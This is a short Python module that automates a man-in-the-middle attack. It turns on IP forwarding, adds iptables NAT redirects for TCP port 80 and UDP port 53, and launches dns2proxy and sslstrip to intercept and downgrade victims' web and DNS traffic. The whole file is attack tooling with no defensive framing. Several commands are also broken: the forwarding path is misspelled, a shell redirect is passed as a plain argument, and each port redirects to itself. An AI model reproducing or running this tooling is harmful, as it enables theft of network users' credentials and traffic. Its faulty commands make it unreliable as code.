import subprocess
import os
from sys import executable

class Redirection:

    def __init__(self):
        pass

    def openPort(self):
        cmd = 'sudo echo "1" > /proc/sys/net/ipv4/ip_forword'
        subprocess.check_output(cmd.split(' '))

    def redirectPort(self):
        port = [['tcp','80'], ['udp','53']]
        for i in range(len(port)):
            cmd = 'sudo iptables -t nat -A PREROUTING -p '+port[i][0]+' --destination-port '+port[i][1]+' -j REDIRECT --to-port '+port[i][1]
            subprocess.check_output(cmd.split(' '))

    def launchDNS2Proxy(self):
        path = os.getcwd()
        path = path + '/dns2proxy/'
        os.chdir(path)
        cmd = 'sudo python dns2proxy.py'
        with open("../stdout.txt","wb") as out, open("../stderr.txt","wb") as err:
            subprocess.Popen(cmd.split(' '), stdin=subprocess.PIPE, stdout=out, stderr=err)

    def launchSSLStrip(self):
        cmd = 'sudo sslstrip -l 80'
        shell = subprocess.Popen(cmd.split(' '), stdin=subprocess.PIPE, stdout=subprocess.PIPE)


   
        

    